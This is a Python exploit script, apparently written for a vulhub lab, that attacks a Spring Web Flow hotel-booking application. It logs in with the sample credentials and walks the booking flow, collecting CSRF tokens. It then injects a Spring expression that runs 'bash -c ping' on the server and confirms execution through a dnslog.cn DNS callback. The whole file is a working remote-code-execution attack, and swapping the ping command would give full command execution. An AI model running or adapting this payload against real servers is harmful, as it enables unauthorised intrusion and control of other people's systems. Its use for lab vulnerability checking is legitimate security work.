import re
import time


import requests
import random


session = requests.Session()

def getdomain():
    try:
        ret = session.get("http://www.dnslog.cn/getdomain.php?t=" + str(random.randint(100000, 999999)),
                          timeout=10).text
    except Exception as e:
        print("getdomain error:" + str(e))
        ret = "error"
        pass
    return ret


def getrecord():
    try:
        ret = session.get("http://www.dnslog.cn/getrecords.php?t=" + str(random.randint(100000, 999999)),
                          timeout=10).text
        # print(ret)
    except Exception as e:
        print("getrecord error:" + str(e))
        ret = "error"
        pass
    return ret



def getdnshost():
    revershost = ""
    try:
        domain = getdomain()
        if domain=="error":
            print("getdomain error")
        else:
            revershost = domain
    except:
        pass
    return revershost


def check(url, proxies):
    if proxies:
        proxies = {proxies['protocol']: proxies['protocol'] + '://' + proxies['ip'] + ':' + str(proxies['port'])}
    if '://' not in url:
        target = 'https://%s' %url if ':443' in url else 'https://%s' %url
    else:
        target = url
    domain = getdnshost()
    ret = {'success': False, 'response': [], 'requests': [], 'error': [], 'info': []}
    if domain:
        reversehost = 'http://'+domain
        try:
            s = requests.Session()
            headers = {
                "User-Agent": "Mozilla / 5.0(Windows NT 10.0;Win64;x64) AppleWebKit / 537.36(KHTML, likeGecko) Chrome / 94."
                              "0.4606.81Safari / 537.36"
            }
            login_r = s.get(url+"/login",headers=headers,timeout=10).text
            csrf1 = re.findall('<input type="hidden" name="_csrf" value="(.*?)" /></form>', login_r, re.DOTALL)[0]
            data = {
                "username": "keith",
                "password": "melbourne",
                "_csrf":csrf1
            }
            s.post(url + "/loginProcess", headers=headers, data=data, timeout=10)
            r = s.get(url + '/hotels/1')
            print(csrf1)
            r = s.get(url + '/hotels/booking?hotelId=1')
            csrf2 = re.findall('<input type="hidden" name="_csrf" value="(.*?)" /></form>', r.text, re.DOTALL)[0]
            print(csrf2)
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
            r=s.get(url+"/hotels/booking?execution=e1s1",headers=headers,timeout=10).text
            csrf3= re.findall('<input type="hidden" name="_csrf" value="(.*?)" /></form>', r, re.DOTALL)[0]
            print(csrf3)
            data_b={
                'checkinDate':'11-26-2021',
                'checkoutDate':'11-27-2021',
                'beds':1,
                'smoking' :'false',
                '_amenities' :'on',
                '_amenities':'on' ,
                '_amenities' : 'on',
                'creditCard' : '1111222233334444' ,
                'creditCardName' : '1111' ,
                'creditCardExpiryMonth' : '1' ,
                'creditCardExpiryYear' : '1' ,
                '_csrf' : csrf3 ,
                '_eventId_proceed' : '_eventId_proceed' ,
                'ajaxSource' : 'proceed'
            }
            book_r=s.post(url+"/hotels/booking?execution=e1s1",data=data_b,headers=headers,timeout=10)
            data2 = f'_eventId_confirm=&_csrf={csrf3}&_(new java.lang.ProcessBuilder("bash","-c","ping {domain}")).start()=vulhub'
            r2 = s.post(url+"/hotels/booking?execution=e1s2", data=data2, proxies=proxies, headers=headers)
            for i in range(1,5):
                time.sleep(2)
                temp = getrecord()
                if domain in temp:
                    ret["success"] = True
                    break
        except ZeroDivisionError as e:
            print(str(e))
            pass
    else:
        print("get dns error")
    return ret

def main(params):
    result = params.get('result',{})
    url=params.get('url','')
    headers=params.get('headers',{})
    proxies=params.get('proxies',None)      #代理
    timeout=params.get('timeout',5)           #超时时间
    result = check(url, proxies)
    return result


if __name__ == '__main__':
    params = {
        'result': {'success': False, 'response': [], 'requests': [], 'error': []},
        # headers：传入的header参数
        'headers': {},
        # proxy：传入的代理服务器参数
        'proxies': {'protocol': 'http', 'ip': '127.0.0.1', 'port': 8080},
        'timeout': 5,
        ###可选参数###
        'url': "http://192.168.160.201:8089",
    }
    ###main方法###
    print(main(params))